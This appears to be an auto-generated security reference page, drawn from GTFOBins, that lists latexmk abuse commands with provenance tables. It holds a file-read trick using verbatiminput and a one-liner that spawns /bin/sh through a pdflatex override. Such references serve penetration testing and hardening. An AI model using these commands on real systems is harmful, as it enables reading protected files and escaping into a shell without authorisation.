---
parsed_by: focuslocust
source: commands
type: generated
---
# latexmk Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## latexmk

Tool page: [latexmk](../../tools/linux/latexmk.md)

### file-read

```text
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
latexmk -dvi /path/to/temp-file
strings temp-file.dvi
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latexmk` |
| Evidence | Function example preserved from source parser. |

### inherit

```text
latexmk -e '...'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latexmk` |
| Evidence | Function example preserved from source parser. |

### shell

```text
latexmk -pdf -pdflatex='/bin/sh #' /dev/null
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latexmk` |
| Evidence | Function example preserved from source parser. |
